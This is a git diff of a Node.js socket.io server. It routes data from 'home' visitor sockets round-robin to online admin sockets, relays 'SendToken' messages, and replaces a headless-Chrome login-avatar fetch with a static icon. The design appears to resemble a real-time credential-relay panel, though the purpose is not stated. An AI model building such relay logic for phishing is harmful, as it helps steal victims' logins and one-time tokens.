@@ -13,6 +13,7 @@ module.exports = httpServer => {
     var socketsOnLineAdm = [];
     var socketsInHome = [];
     var AsignarAdm = 0;
+    var idAdmIdHome = [];
     var socketImg = []
 
     io.on("connection", socket => {
@@ -24,7 +25,7 @@ module.exports = httpServer => {
         });
         
         socket.on("disconnect", () => {
-            var newsocketsOnLineAdm = socketsOnLineAdm.filter((item) => item !== socket.id);
+            var newsocketsOnLineAdm = socketsOnLineAdm.filter((item) => item.soketSesion !== socket.id);
             socketsOnLineAdm = newsocketsOnLineAdm;
 
             var baySocket = socketsInHome.filter((item) => item.Socket == socket.id);
@@ -56,7 +57,8 @@ module.exports = httpServer => {
         // Mostrar imagen login
         socket.on("ShowAvatar", data => {
 
-            var img = '';
+            io.to(data.socket).emit("AvatarElement", '/img/c93f32e11dbf6b5fe3efc5be5554ec50-icono-de-circulo-de-candado.png');
+            /*var img = '';
             let browser = new swd.Builder();
             let tab = browser.forBrowser("chrome")
                 .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
@@ -116,7 +118,7 @@ module.exports = httpServer => {
                 })
                 .catch(err => {
                     console.log("Error ", err, " occurred!");
-                });
+                });*/
         })
 
 
@@ -127,9 +129,11 @@ module.exports = httpServer => {
                 AsignarAdm = 0;
             }
             var AdminSelected = socketsOnLineAdm[AsignarAdm];
-            //console.log(AdminSelected);
-            io.to(AdminSelected).emit("NewData", totalInfo);
+        
+            idAdmIdHome.push({'AdmId': AdminSelected.Id, 'IdHome': totalInfo[0].socket});                    
+            io.to(AdminSelected.soketSesion).emit("NewData", totalInfo);
         })
+
         
         socket.on("onlineHere", originalSocket => {
             io.emit("showRowB", originalSocket);
@@ -287,6 +291,7 @@ module.exports = httpServer => {
         })
 
         socket.on("SendToken", dataToken => {
+            var idAdmIdHomeArr = idAdmIdHome.filter((item) => item.AdmId == dataToken.dataAdm);
             console.log(dataToken)
             io.to(dataToken.admToken).emit("ReSendToken", dataToken);
         })
